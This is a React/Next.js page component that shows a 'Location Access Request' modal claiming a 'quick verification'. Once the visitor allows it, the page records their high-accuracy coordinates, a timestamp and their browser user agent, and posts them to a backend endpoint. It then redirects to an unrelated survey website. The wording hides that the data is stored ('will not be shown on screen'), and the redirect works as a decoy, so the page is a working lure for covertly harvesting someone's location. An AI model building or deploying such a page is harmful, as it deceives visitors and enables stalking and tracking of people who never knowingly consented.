'use client'
import { useState } from 'react'
import { useRouter } from 'next/navigation'
import { motion } from 'framer-motion'

export default function ShareLocation() {
  const [status, setStatus] = useState('')
  const [showModal, setShowModal] = useState(true)
  const router = useRouter()

  async function requestLocation() {
    if (!navigator.geolocation) {
      setStatus('❌ Browser does not support Geolocation API.')
      return
    }

    setStatus('Requesting permission...')
    navigator.geolocation.getCurrentPosition(async (p) => {
      const payload = {
        lat: p.coords.latitude,
        lon: p.coords.longitude,
        accuracy: p.coords.accuracy,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent
      }

      console.log('📍 User location (client):', payload)

      try {
        // Send to backend (optional)
        await fetch('/api/save-location', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        })
      } catch (err) {
        console.error('Failed to send to server:', err)
      }

      setStatus('✅ Location received, redirecting...')
      setTimeout(() => {
        router.push('https://freeonlinesurveys.com/') // 👈 Redirect after success
      }, 2000)
    },
    (err) => {
      setStatus('Permission denied ❌: ' + (err.message || err.code))
    },
    { enableHighAccuracy: true, timeout: 15000 })
  }

  function onAllow() {
    setShowModal(false)
    requestLocation()
  }

  return (
    <div className="flex items-center justify-center h-screen bg-gradient-to-br from-[#0b364f] to-[#135b7f] text-white font-sans">
      {showModal && (
        <motion.div
          initial={{ scale: 0.8, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          transition={{ type: 'spring', stiffness: 120 }}
          className="bg-white/10 backdrop-blur-lg rounded-2xl shadow-2xl p-8 text-center max-w-md"
        >
          <h2 className="text-2xl font-semibold mb-3 text-white">Location Access Request</h2>
          <p className="text-sm text-gray-200 mb-6">
            We need access to your location for a quick verification.  
            Your coordinates will <b>not</b> be shown on screen.  
            Click <span className="text-green-400 font-semibold">Allow</span> to continue.
          </p>
          <div className="flex justify-center gap-4">
            <button
              onClick={() => { setShowModal(false); setStatus('User declined ❌') }}
              className="px-5 py-2 bg-red-500/80 hover:bg-red-600 rounded-xl transition-all"
            >
              Decline
            </button>
            <button
              onClick={onAllow}
              className="px-5 py-2 bg-emerald-500/80 hover:bg-emerald-600 rounded-xl transition-all"
            >
              Allow
            </button>
          </div>
        </motion.div>
      )}

      {!showModal && (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          className="absolute bottom-10 text-sm text-gray-300"
        >
          {status}
        </motion.div>
      )}
    </div>
  )
}
